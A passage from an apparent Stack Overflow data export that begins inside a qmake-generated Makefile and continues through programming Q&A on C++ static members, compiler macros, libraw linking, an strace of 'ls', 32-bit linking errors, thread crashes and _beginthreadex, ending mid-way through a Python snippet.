        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/qconfig.pri \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/modules/qt_webkit_version.pri \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/qt_functions.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/qt_config.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/exclusive_builds.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/default_pre.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/debug.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/default_post.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/warn_on.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/qt.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/unix/thread.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/moc.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/resources.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/uic.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/yacc.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/lex.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/include_source_dir.prf \
        UnitTest.pro
QMAKE_TARGET  = UnitTest
DESTDIR       = 
TARGET        = UnitTest

first: all
####### Implicit rules

.SUFFIXES: .o .c .cpp .cc .cxx .C

.cpp.o:
    $(CXX) -c $(CXXFLAGS) $(INCPATH) -o ""$@"" ""$&lt;""

.cc.o:
    $(CXX) -c $(CXXFLAGS) $(INCPATH) -o ""$@"" ""$&lt;""

.cxx.o:
    $(CXX) -c $(CXXFLAGS) $(INCPATH) -o ""$@"" ""$&lt;""

.C.o:
    $(CXX) -c $(CXXFLAGS) $(INCPATH) -o ""$@"" ""$&lt;""

.c.o:
    $(CC) -c $(CFLAGS) $(INCPATH) -o ""$@"" ""$&lt;""

####### Build rules

all: Makefile $(TARGET)

$(TARGET):  $(OBJECTS)  
    $(LINK) $(LFLAGS) -o $(TARGET) $(OBJECTS) $(OBJCOMP) $(LIBS)

Makefile: UnitTest.pro  /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/qws/linux-x86-g++/qmake.conf /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/common/g++.conf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/common/unix.conf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/common/linux.conf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/common/qws.conf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/qconfig.pri \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/modules/qt_webkit_version.pri \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/qt_functions.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/qt_config.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/exclusive_builds.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/default_pre.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/debug.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/default_post.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/warn_on.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/qt.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/unix/thread.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/moc.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/resources.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/uic.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/yacc.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/lex.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/include_source_dir.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/lib/libQtNetwork.prl \
        /usr/local/Trolltech/QtEmbedded-4.7.3/lib/libQtCore.prl
    $(QMAKE) -spec /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/qws/linux-x86-g++ CONFIG+=debug QMLJSDEBUGGER_PATH=/usr/share/qtcreator/qml/qmljsdebugger -o Makefile UnitTest.pro
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/common/g++.conf:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/common/unix.conf:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/common/linux.conf:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/common/qws.conf:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/qconfig.pri:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/modules/qt_webkit_version.pri:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/qt_functions.prf:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/qt_config.prf:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/exclusive_builds.prf:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/default_pre.prf:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/debug.prf:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/default_post.prf:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/warn_on.prf:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/qt.prf:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/unix/thread.prf:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/moc.prf:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/resources.prf:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/uic.prf:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/yacc.prf:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/lex.prf:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/include_source_dir.prf:
/usr/local/Trolltech/QtEmbedded-4.7.3/lib/libQtNetwork.prl:
/usr/local/Trolltech/QtEmbedded-4.7.3/lib/libQtCore.prl:
qmake:  FORCE
    @$(QMAKE) -spec /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/qws/linux-x86-g++ CONFIG+=debug QMLJSDEBUGGER_PATH=/usr/share/qtcreator/qml/qmljsdebugger -o Makefile UnitTest.pro

dist: 
    @$(CHK_DIR_EXISTS) .tmp/UnitTest1.0.0 || $(MKDIR) .tmp/UnitTest1.0.0 
    $(COPY_FILE) --parents $(SOURCES) $(DIST) .tmp/UnitTest1.0.0/ &amp;&amp; $(COPY_FILE) --parents ../src/TipCoordinate.hpp .tmp/UnitTest1.0.0/ &amp;&amp; $(COPY_FILE) --parents main.cpp ../src/TipCoordinate.cpp .tmp/UnitTest1.0.0/ &amp;&amp; (cd `dirname .tmp/UnitTest1.0.0` &amp;&amp; $(TAR) UnitTest1.0.0.tar UnitTest1.0.0 &amp;&amp; $(COMPRESS) UnitTest1.0.0.tar) &amp;&amp; $(MOVE) `dirname .tmp/UnitTest1.0.0`/UnitTest1.0.0.tar.gz . &amp;&amp; $(DEL_FILE) -r .tmp/UnitTest1.0.0


clean:compiler_clean 
    -$(DEL_FILE) $(OBJECTS)
    -$(DEL_FILE) *~ core *.core


####### Sub-libraries

distclean: clean
    -$(DEL_FILE) $(TARGET) 
    -$(DEL_FILE) Makefile


check: first

mocclean: compiler_moc_header_clean compiler_moc_source_clean

mocables: compiler_moc_header_make_all compiler_moc_source_make_all

compiler_moc_header_make_all:
compiler_moc_header_clean:
compiler_rcc_make_all:
compiler_rcc_clean:
compiler_image_collection_make_all: qmake_image_collection.cpp
compiler_image_collection_clean:
    -$(DEL_FILE) qmake_image_collection.cpp
compiler_moc_source_make_all:
compiler_moc_source_clean:
compiler_uic_make_all:
compiler_uic_clean:
compiler_yacc_decl_make_all:
compiler_yacc_decl_clean:
compiler_yacc_impl_make_all:
compiler_yacc_impl_clean:
compiler_lex_make_all:
compiler_lex_clean:
compiler_clean: 

####### Compile

main.o: main.cpp 
    $(CXX) -c $(CXXFLAGS) $(INCPATH) -o main.o main.cpp

TipCoordinate.o: ../src/TipCoordinate.cpp ../src/TipCoordinate.hpp
    $(CXX) -c $(CXXFLAGS) $(INCPATH) -o TipCoordinate.o ../src/TipCoordinate.cpp

####### Install

install:   FORCE

uninstall:   FORCE

FORCE:
</code></pre>

<p>I see a scroll box has appeared, but if there is a way to make that appear more concise, I welcome any tips.</p>
","9530","","<p>The difference in behavior you're seeing is to the optimizer.  For whatever reason, the optimizer decides to optimize out the math and replace it with a floating-point constant in some of the cases, but not all of the cases.  When it does that, no error occurs, because the variable <code>sREFERENCE_SPHERE_RADIUS</code> is never referenced anywhere.</p>

<p>What <em>should</em> be happening is that you ought to be getting the ""undefined reference"" error in all of the cases, because the variable <code>sREFERENCE_SPHERE_RADIUS</code> needs to be given an explicit definition outside of the class definition.  The C++ standard only allows you to give an initializer of a <code>static</code> class member if it's of integral or enumerated type:</p>

<pre><code>// Header file
class TipCoordinate
{
    static const float sREFERENCE_SPHERE_RADIUS;  // declaration
};

// Source file
const float TipCoordinate::sREFERENCE_SPHERE_RADIUS = 12;  // definition
</code></pre>

<p>From C++03 §9.2/4:</p>

<blockquote>
  <p>A <em>member-declarator</em> can contain a <em>constant-initializer</em> only if it declares a <code>static</code> member (9.4) of
  <code>const</code> integral or <code>const</code> enumeration type, see 9.4.2.</p>
</blockquote>

<p>In the latest version of the C++ language, C++11, the rules are a little looser, and you can define floating-point constants in the declaration, but you have to use <code>constexpr</code> instead of <code>const</code>.</p>
"
"<p>I have some code that doesn't compile with the llvm compiler that is the default in xcode4.5, how can I #ifdef out that code?</p>

<p>thank</p>
","9530","","<p>I suggest you fix your code, you're probably relying on undefined/unspecified behavior that just happens to be accepted by other compilers.  Post your code and the error messages, and we can help you fix it.</p>

<p>But if you insist on just treating the symptoms and not the cause, you can figure out what preprocessor macros the compiler defines by running this command from the terminal:</p>

<pre><code># This should work for any GCC, LLVM, or Clang variant
/path/to/your/compiler -dM -E -xc /dev/null | sort
</code></pre>

<p>From that output, look for macros indicating the specific compiler and version.</p>
"
"<p>Is anyone using libraw with mingw? I am trying to compile a program and get the following errors:</p>

<pre><code>obj\Release\inc\img\cimg.o:cimg.cpp|| undefined reference to `_imp___ZN6LibRawC1Ej'|
obj\Release\inc\img\cimg.o:cimg.cpp|| undefined reference to `_imp___ZN6LibRaw9open_fileEPKcx'|
obj\Release\inc\img\cimg.o:cimg.cpp|| undefined reference to `_imp___ZN6LibRaw6unpackEv'|
obj\Release\inc\img\cimg.o:cimg.cpp|| undefined reference to `_imp___ZN6LibRaw13dcraw_processEv'|
obj\Release\inc\img\cimg.o:cimg.cpp|| undefined reference to `_imp___ZN6LibRaw20dcraw_make_mem_imageEPi'|
obj\Release\inc\img\cimg.o:cimg.cpp|| undefined reference to `_imp___ZN6LibRaw7recycleEv'|
obj\Release\inc\img\cimg.o:cimg.cpp:(.text$_ZN6LibRawD1Ev[LibRaw::~LibRaw()]+0xf)||undefined reference to `_imp___ZN6LibRaw7recycleEv'|
||=== Build finished: 7 errors, 0 warnings ===|
</code></pre>

<p>I added libraw.a to my project. Can't figure the problem out.
Has anyone an idea?</p>
","9530","","<p>From those symbol names, it looks like you're trying to compile against a DLL version of libraw (hinted at by the <code>_imp___</code> prefix).  Check your libraw header files and make sure that the function names don't have anything like <code>__declspec(dllimport)</code> or <code>__attribute__((dllimport))</code> in front of them.  These are sometimes hidden by a macro definition, so check the header files to see if there's another macro you can define which will cause it not to use that attribute in the function prototypes.</p>
"
"<p>I wanted to know which system call is used in linux by the ls command to display the folder's (or file's name)? Especially the files/folders starting with ""."" (dot)</p>

<p>I executed the <code>strace ls -a</code> command to look at the system calls.There is a lot of <code>fstat</code> calls which occur for the all the other attributes (inode to permisisons).  Which one actually gives it's name?</p>

<pre><code>execve(""/bin/ls"", [""ls"", ""-a""], [/* 37 vars */]) = 0
brk(0)                                  = 0x1762000
access(""/etc/ld.so.nohwcap"", F_OK)      = -1 ENOENT (No such file or directory)
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f1c14025000
access(""/etc/ld.so.preload"", R_OK)      = -1 ENOENT (No such file or directory)
open(""/etc/ld.so.cache"", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=109464, ...}) = 0
mmap(NULL, 109464, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f1c1400a000
close(3)                                = 0
access(""/etc/ld.so.nohwcap"", F_OK)      = -1 ENOENT (No such file or directory)
open(""/lib/x86_64-linux-gnu/libselinux.so.1"", O_RDONLY|O_CLOEXEC) = 3
read(3, ""\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0\20T\0\0\0\0\0\0""..., 832) = 832
fstat(3, {st_mode=S_IFREG|0644, st_size=121936, ...}) = 0
mmap(NULL, 2221680, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f1c13be6000
mprotect(0x7f1c13c03000, 2093056, PROT_NONE) = 0
mmap(0x7f1c13e02000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1c000) = 0x7f1c13e02000
mmap(0x7f1c13e04000, 1648, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f1c13e04000
close(3)                                = 0
access(""/etc/ld.so.nohwcap"", F_OK)      = -1 ENOENT (No such file or directory)
open(""/lib/x86_64-linux-gnu/librt.so.1"", O_RDONLY|O_CLOEXEC) = 3
read(3, ""\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0\340!\0\0\0\0\0\0""..., 832) = 832
fstat(3, {st_mode=S_IFREG|0644, st_size=31752, ...}) = 0
mmap(NULL, 2128984, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f1c139de000
mprotect(0x7f1c139e5000, 2093056, PROT_NONE) = 0
mmap(0x7f1c13be4000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x6000) = 0x7f1c13be4000
close(3)                                = 0
access(""/etc/ld.so.nohwcap"", F_OK)      = -1 ENOENT (No such file or directory)
open(""/lib/x86_64-linux-gnu/libacl.so.1"", O_RDONLY|O_CLOEXEC) = 3
read(3, ""\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0P\33\0\0\0\0\0\0""..., 832) = 832
fstat(3, {st_mode=S_IFREG|0644, st_size=31096, ...}) = 0
mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f1c14009000
mmap(NULL, 2126312, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f1c137d6000
mprotect(0x7f1c137dd000, 2093056, PROT_NONE) = 0
mmap(0x7f1c139dc000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x6000) = 0x7f1c139dc000
close(3)                                = 0
access(""/etc/ld.so.nohwcap"", F_OK)      = -1 ENOENT (No such file or directory)
open(""/lib/x86_64-linux-gnu/libc.so.6"", O_RDONLY|O_CLOEXEC) = 3
read(3, ""\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0\200\30\2\0\0\0\0\0""..., 832) = 832
fstat(3, {st_mode=S_IFREG|0755, st_size=1811128, ...}) = 0
mmap(NULL, 3925208, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f1c13417000
mprotect(0x7f1c135cc000, 2093056, PROT_NONE) = 0
mmap(0x7f1c137cb000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1b4000) = 0x7f1c137cb000
mmap(0x7f1c137d1000, 17624, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f1c137d1000
close(3)                                = 0
access(""/etc/ld.so.nohwcap"", F_OK)      = -1 ENOENT (No such file or directory)
open(""/lib/x86_64-linux-gnu/libdl.so.2"", O_RDONLY|O_CLOEXEC) = 3
read(3, ""\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0\340\r\0\0\0\0\0\0""..., 832) = 832
fstat(3, {st_mode=S_IFREG|0644, st_size=14768, ...}) = 0
mmap(NULL, 2109704, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f1c13213000
mprotect(0x7f1c13215000, 2097152, PROT_NONE) = 0
mmap(0x7f1c13415000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) = 0x7f1c13415000
close(3)                                = 0
access(""/etc/ld.so.nohwcap"", F_OK)      = -1 ENOENT (No such file or directory)
open(""/lib/x86_64-linux-gnu/libpthread.so.0"", O_RDONLY|O_CLOEXEC) = 3
read(3, ""\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0\200l\0\0\0\0\0\0""..., 832) = 832
fstat(3, {st_mode=S_IFREG|0755, st_size=135366, ...}) = 0
mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f1c14008000
mmap(NULL, 2212904, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f1c12ff6000
mprotect(0x7f1c1300e000, 2093056, PROT_NONE) = 0
mmap(0x7f1c1320d000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x17000) = 0x7f1c1320d000
mmap(0x7f1c1320f000, 13352, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f1c1320f000
close(3)                                = 0
access(""/etc/ld.so.nohwcap"", F_OK)      = -1 ENOENT (No such file or directory)
open(""/lib/x86_64-linux-gnu/libattr.so.1"", O_RDONLY|O_CLOEXEC) = 3
read(3, ""\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0\340\17\0\0\0\0\0\0""..., 832) = 832
fstat(3, {st_mode=S_IFREG|0644, st_size=18552, ...}) = 0
mmap(NULL, 2113736, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f1c12df1000
mprotect(0x7f1c12df5000, 2093056, PROT_NONE) = 0
mmap(0x7f1c12ff4000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x3000) = 0x7f1c12ff4000
close(3)                                = 0
mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f1c14007000
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f1c14005000
arch_prctl(ARCH_SET_FS, 0x7f1c140057c0) = 0
mprotect(0x7f1c137cb000, 16384, PROT_READ) = 0
mprotect(0x7f1c12ff4000, 4096, PROT_READ) = 0
mprotect(0x7f1c1320d000, 4096, PROT_READ) = 0
mprotect(0x7f1c13415000, 4096, PROT_READ) = 0
mprotect(0x7f1c139dc000, 4096, PROT_READ) = 0
mprotect(0x7f1c13be4000, 4096, PROT_READ) = 0
mprotect(0x7f1c13e02000, 4096, PROT_READ) = 0
mprotect(0x618000, 4096, PROT_READ)     = 0
mprotect(0x7f1c14027000, 4096, PROT_READ) = 0
munmap(0x7f1c1400a000, 109464)          = 0
set_tid_address(0x7f1c14005a90)         = 4490
set_robust_list(0x7f1c14005aa0, 0x18)   = 0
futex(0x7fff2e09d99c, FUTEX_WAIT_BITSET_PRIVATE|FUTEX_CLOCK_REALTIME, 1, NULL, 7f1c140057c0) = -1 EAGAIN (Resource temporarily unavailable)
rt_sigaction(SIGRTMIN, {0x7f1c12ffc750, [], SA_RESTORER|SA_SIGINFO, 0x7f1c13005cb0}, NULL, 8) = 0
rt_sigaction(SIGRT_1, {0x7f1c12ffc7e0, [], SA_RESTORER|SA_RESTART|SA_SIGINFO, 0x7f1c13005cb0}, NULL, 8) = 0
rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
statfs(""/selinux"", {f_type=""EXT2_SUPER_MAGIC"", f_bsize=4096, f_blocks=238304997, f_bfree=232078639, f_bavail=219973436, f_files=60530688, f_ffree=60120220, f_fsid={-1173666966, -474985328}, f_namelen=255, f_frsize=4096}) = 0
brk(0)                                  = 0x1762000
brk(0x1783000)                          = 0x1783000
open(""/proc/filesystems"", O_RDONLY)     = 3
fstat(3, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f1c14024000
read(3, ""nodev\tsysfs\nnodev\trootfs\nnodev\tb""..., 1024) = 328
read(3, """", 1024)                       = 0
close(3)                                = 0
munmap(0x7f1c14024000, 4096)            = 0
open(""/usr/lib/locale/locale-archive"", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=7220736, ...}) = 0
mmap(NULL, 7220736, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f1c1270e000
close(3)                                = 0
ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, {B38400 opost isig icanon echo ...}) = 0
ioctl(1, TIOCGWINSZ, {ws_row=41, ws_col=144, ws_xpixel=0, ws_ypixel=0}) = 0
openat(AT_FDCWD, ""."", O_RDONLY|O_NONBLOCK|O_DIRECTORY|O_CLOEXEC) = 3
getdents(3, /* 2 entries */, 32768)     = 48
getdents(3, /* 0 entries */, 32768)     = 0
close(3)                                = 0
fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f1c14024000
write(1, "".  ..\n"", 6.  ..
)                  = 6
close(1)                                = 0
munmap(0x7f1c14024000, 4096)            = 0
close(2)                                = 0
exit_group(0)                           = ?
</code></pre>
","9530","","<p>Most of the system calls there are noise from loading shared libraries at startup.  The interesting things happen here:</p>

<pre><code>openat(AT_FDCWD, ""."", O_RDONLY|O_NONBLOCK|O_DIRECTORY|O_CLOEXEC) = 3
getdents(3, /* 2 entries */, 32768)     = 48
getdents(3, /* 0 entries */, 32768)     = 0
close(3)  
</code></pre>

<p>The <a href=""http://linux.die.net/man/2/openat""><code>openat(2)</code></a> system call is used to open the current directory (<code>"".""</code>) relative to the current working directory (the <code>AT_FDCWD</code> flag).  The <code>O_DIRECTORY</code> flag indicates that it wants to open the directory and read the directory's contents.</p>

<p>The actual directory data isread using the <a href=""http://linux.die.net/man/2/getdents""><code>getdents(2)</code></a> system call.  In this case, it called it twice, since until it returns 0, it's not sure if there's more data or not.  Finally, the file descriptor is closed after it's done.</p>

<p>If you were to write your own program, however, you wouldn't call these directly -- instead you'd use <a href=""http://linux.die.net/man/3/opendir""><code>opendir(3)</code></a>, <a href=""http://linux.die.net/man/3/readdir""><code>readdir(3)</code></a>, and <a href=""http://linux.die.net/man/3/closedir""><code>closedir(3)</code></a> to read a directory.  They're portable (POSIX-compliant), and they insulate you from the details of the underlying system calls.  They're also easier to use, IMO.</p>
"
"<p>Im having trouble using my make file for a program i am writing in a linux environment. The program is a fern fractal that uses bitmapImage.h and bitmapImage.so given to me by my professor. Whenever i attempt to run the make file i get a long string of errors, the main one being : </p>

<pre><code>    make
g++    -c -o fern.o fern.cpp
g++    -c -o fernType.o fernType.cpp
g++ -m32 -o fern fern.o fernType.o bitmapImage.so
/usr/bin/ld: cannot find crt1.o: No such file or directory
/usr/bin/ld: cannot find crti.o: No such file or directory
/usr/bin/ld: skipping incompatible /usr/lib/gcc/x86_64-linux-gnu/4.6/libstdc++.so when searching for -lstdc++
/usr/bin/ld: skipping incompatible /usr/lib/gcc/x86_64-linux-gnu/4.6/libstdc++.a when searching for -lstdc++
/usr/bin/ld: cannot find -lstdc++
/usr/bin/ld: cannot find -lm
/usr/bin/ld: skipping incompatible /usr/lib/gcc/x86_64-linux-gnu/4.6/libgcc_s.so when searching for -lgcc_s
/usr/bin/ld: cannot find -lgcc_s
/usr/bin/ld: skipping incompatible /usr/lib/gcc/x86_64-linux-gnu/4.6/libgcc.a when searching for -lgcc
/usr/bin/ld: cannot find -lgcc
/usr/bin/ld: cannot find -lc
/usr/bin/ld: skipping incompatible /usr/lib/gcc/x86_64-linux-gnu/4.6/libgcc_s.so when searching for -lgcc_s
/usr/bin/ld: cannot find -lgcc_s
/usr/bin/ld: skipping incompatible /usr/lib/gcc/x86_64-linux-gnu/4.6/libgcc.a when searching for -lgcc
/usr/bin/ld: cannot find -lgcc
/usr/bin/ld: cannot find crtn.o: No such file or directory
collect2: ld returned 1 exit status
make: *** [spiro] Error 1
</code></pre>

<p><em>my guess is that the bitmapImage.so is designed for a 32 bit system, but my virtual machine ubuntu runs 64-bit. How do i go about fixing this so i can compile my program? Thanks!</em></p>

<p>EDIT: updated my old post to show the current error i am getting</p>

<p>MakeFile:</p>

<pre><code># Make file for spirograph program

## note, uses bitmapImage shared object file (library).

OBJS = fern.o fernType.o
CC  = g++ -m32
DEPS1 = fernType.h
DEPS2 = bitmapImage.h

all: spiro

spiro: $(OBJS)
    $(CC) -m32 -o fern $(OBJS) bitmapImage.so

spiro.o:    fern.cpp $(DEPS1)
    $(CC) -m32 -c fern.cpp

spiroType.o:    fernType.cpp $(DEPS1) $(DEPS2)
    $(CC) -m32 -c fernType.cpp

# -----
# clean by removing object files.

clean:
    rm  $(OBJS)
</code></pre>
","9530","","<p>Yes, that's exactly the problem -- you can't link a 32-bit object file with a 64-bit object file.  You need to either:</p>

<ul>
<li>Compile on a 32-bit machine (real or virtual),</li>
<li>Ask your professor for a 64-bit library, or</li>
<li>Ask for the source code to the library so you can compile it all yourself</li>
</ul>
"
"<p>I can't seem to understand what's causing me this crash, it points me to no line number anywhere in the code.</p>

<p><img src=""http://i.stack.imgur.com/bzCE1.png"" alt=""enter image description here""></p>

<p>Any ideas? I can't reproduce the crash constantly, causing it to be harder to debug.</p>
","9530","","<p>Are you sure that that's the thread that's crashing?  That thread looks rather benign -- it looks like a worker thread owned by the Quartz library, and it's just waiting on a lock, which is a common operation that's unlikely to crash, unless you have random memory corruption.</p>

<p>Take a look at the stack traces of <strong>all</strong> of your threads, there might be something that jumps out more at you.  Or, to be sure that that thread is crashing, take a look at the disassembly and see which instruction caused the crash, and examine the relevant registers and memory operands in the debugger.</p>

<p>If that thread is in fact crashing, you almost certainly have memory corruption somewhere in your program, which is very hard to debug.  Search around for memory debugging tools, there are lots of options, but there's no silver bullet.</p>
"
"<p>How do I start a thread using <code>_beginthreadex()</code>, making it execute <code>void myFunction(wchar_t *param);</code>?   I try to use this:</p>

<pre><code>_beginthread(NULL, 0, myFunction, L""someParam"", 0, &amp;ThreadID);
</code></pre>

<p>but there is compilation error:</p>

<blockquote>
  <p>error C2664: '<em>beginthreadex' : cannot convert parameter 3 from 'void (</em>_cdecl *)(wchar_t *)' to 'unsigned int (__stdcall *)(void *)'. </p>
</blockquote>

<p>How I can resolve this error?   I seem able to do <code>_beginthread((void(*)(void*))myFunction, 0 , (void *)L""someParam"");</code>. But for <code>_beginthreadex()</code> these casts don't seem to work. What do 
I need to do?
This code doesn't output anything. What's wrong?</p>

<pre><code>unsigned int __stdcall myFunction( void *someParam )
{
    printf(""Hello world!"");
    return 0;
}


int _tmain(int argc, _TCHAR* argv[])
{
    _beginthreadex(NULL, 0, myFunction, L""param"", 0, NULL);
    return 0;
}
</code></pre>
","9530","","<p><code>_beginthreadex</code> requires a function that uses the <code>__stdcall</code> <a href=""http://blogs.msdn.com/b/oldnewthing/archive/2004/01/15/58973.aspx"" rel=""nofollow"">calling convention</a>, not the <code>__cdecl</code> calling convention, which is the default.  To fix it, declare your thread procedure with the <code>__stdcall</code> calling convention:</p>

<pre><code>unsigned int __stdcall myFunction(void *arg)
{
    ...
}
</code></pre>

<p>Do NOT cast the function pointer you're passing into <code>_beginthread</code> or <code>_beginthreadex</code>: <a href=""http://blogs.msdn.com/b/oldnewthing/archive/2011/05/06/10161590.aspx"" rel=""nofollow"">a function pointer cast is a bug waiting to happen</a>.</p>
"
"<p>Here is my code (almost full version for @cdhowie :)):</p>

<pre><code>def getResult(method, argument=None):
  result = None

  while True:
    print('### loop')
    try:
      print ('### try hard...')
      if argument:
        result = method(argument)
      else:
        result = method()
      break
    except Exception as e:
      print('### GithubException')
      if 403 == e.status:
